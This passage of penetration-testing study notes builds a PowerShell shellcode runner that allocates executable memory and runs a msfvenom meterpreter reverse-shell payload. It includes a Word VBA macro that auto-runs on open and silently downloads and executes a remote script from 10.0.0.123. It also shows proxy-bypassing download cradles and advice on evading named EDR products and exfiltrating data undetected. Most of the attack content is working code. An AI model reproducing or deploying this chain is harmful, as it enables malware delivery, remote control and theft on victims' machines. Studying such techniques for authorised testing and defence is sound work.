$MyMethodBuilder.SetImplementationFlags('Runtime, Managed')

# To instantiate the delegate type, we call our custom constructor through the CreateType method
$MyDelegateType = $MyTypeBuilder.CreateType()

# Have a delegate type to use
$MyFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($MessageBoxA, $MyDelegateType)
$MyFunction.Invoke([IntPtr]::Zero,"DelegateType Reflection",0)
```

![[Pasted image 20240531162916.png]]

## 3.6.4 PowerShell Shellcode Runner v2

The next is the "DelegateType Reflection" optimization code for a function. Remove unnecessary variable, make code neat, ...

```powershell
function getDelegateType {
    Param (
    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
    [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    
    # creates the custom assembly and defines the module and type inside of it.
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
    [System.MulticastDelegate])

	# sets up the constructor
	$type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
    [System.Reflection.CallingConventions]::Standard, $func).
    SetImplementationFlags('Runtime, Managed')

	# sets up the invoke method
	$type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
    SetImplementationFlags('Runtime, Managed')
	
    return $type.CreateType()
}
```

`LookupFunc()` function + `getDelegateType()` function. Put it all together, to create a simple PowerShell Shellcode Runner v2

The complete code 

```powershell
# leveraging UnsafeNativeMethods
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
    @($moduleName)), $functionName))
}

function getDelegateType {
    Param (
    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
    [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
    [System.MulticastDelegate])
    
	$type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
    [System.Reflection.CallingConventions]::Standard, $func).
    SetImplementationFlags('Runtime, Managed')
    
	$type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
    SetImplementationFlags('Runtime, Managed')
	
    return $type.CreateType()
}

# Allocate executable memory
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), 
  (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.1.123 LPORT=443 -f ps1
[Byte[]] $buf = SHELLCODE_GO_HERE

# Copy shellcode to allocated memory
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

# Execute shellcode
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread),
  (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
  
# wait for it to exit
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject),
  (getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

VBA

```vb
Sub MyMacro()
	Dim str As String
	str = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile (New-Object System.Net.WebClient).DownloadString('http://10.0.0.123/Simple_Shellcode_Runner_Powershell_v2.ps1')|IEX"
	Shell str, vbHide
End Sub

Sub Document_Open()
 MyMacro 
End Sub

Sub AutoOpen()
 MyMacro
End Sub
```

![[Pasted image 20240531210243.png]]

# 3.7 Talking To The Proxy

Proxies play a crucial role in penetration testing, particularly in environments where organizations route network communications through proxy servers. This setup allows security analysts to scrutinize traffic, presenting unique challenges and opportunities for penetration testers.

To effectively navigate these scenarios, testers must either adapt their techniques to function seamlessly through proxies or strategically bypass these proxies to evade monitoring when necessary. For instance, while Meterpreter's HTTP and HTTPS payloads are designed to be [proxy-aware](https://www.rapid7.com/blog/post/2011/06/29/meterpreter-httphttps-communication/), PowerShell download cradles might not automatically respect proxy settings. Therefore, it's critical for penetration testers to verify their tools' compatibility with target environments' proxy configurations.

As security landscapes evolve, continuously assessing and updating penetration testing strategies to align with modern proxy usage and detection capabilities is essential. This ensures that testing approaches remain robust, discreet, and aligned with best practices
## 3.7.1 PowerShell Proxy-Aware communication

In modern network environments, ensuring secure and stealthy communication often requires navigating through or around Proxy servers. PowerShell provides flexibility to manage proxy settings dynamically, allowing for both direct internet access and proxy evasion techniques, which can be critical during red team engagements.

```powershell
# Create a WebClient object to manage web requests
$wc = new-object system.net.WebClient 

# Disable proxy settings to attempt direct connections
$wc.proxy = $null 

# Download script or payload directly
$wc.DownloadString("http://10.0.0.123/staged_payload.ps1")
```

While disabling proxy settings facilitates direct connections that may bypass certain network monitoring setups, but it's crucial to assess the network's edge firewall policies. In environments where all outgoing connections are required to pass through a proxy, this approach might result in blocked communications. Therefore, pentesters should be prepared to dynamically adjust the `WebClient` proxy settings to align with the environment's configuration and circumvent detection mechanisms effectively.

For enhanced evasion in environments protected by solutions like TrendMicro, RealVNC, SentinelOne Singularity, Crowdstrike Falcon, ... consider employing more sophisticated techniques such as:

- **Encrypted Channels**: Use HTTPS for all communications to obscure the data in transit and avoid content-based filtering.
- **Proxy Pivoting**: Instead of disabling the proxy, configure `WebClient` to use a rogue or compromised proxy server that you control, which can relay requests without scrutiny.
- **Domain Fronting**: Employ domain fronting techniques where possible to disguise the true destination of HTTPS requests by leveraging reputable, third-party service domains.

These methods increase the likelihood of maintaining access and exfiltrating data without detection, aligning with the objectives of advanced penetration testing and red team operations

### 3.7.2 Add the User-Agent header

Because `Net.WebClient` Powershell don't have a default "User-Agent" header, so manual set it in HTTPS request.

```powershell
# Create a WebClient object to manage web requests
$wc = new-object system.Net.WebClient 

# Add "User-Agent" header in HTTPS request
$wc.Headers.Add('User-Agent', "This is my agent, there is no one like it...")

# Download script or payload directly
$wc.DownloadString("http://10.0.0.123/staged_payload.ps1")
```

### 3.7.3 Give me a SYSTEM proxy

In this context, the application runs as SYSTEM. A PowerShell download cradle may fail to call back to C2 server.

# Wrapping Up

This module focuses on exploiting the human and discusses how to craft convincing pretexts. 

Introduction to Client-side attack via Microsoft Word (macro) + Powershell.

Execution of arbitrary Win32 API directly in memory, write a Simple Shellcode Runner in PowerShell and VBA.

.
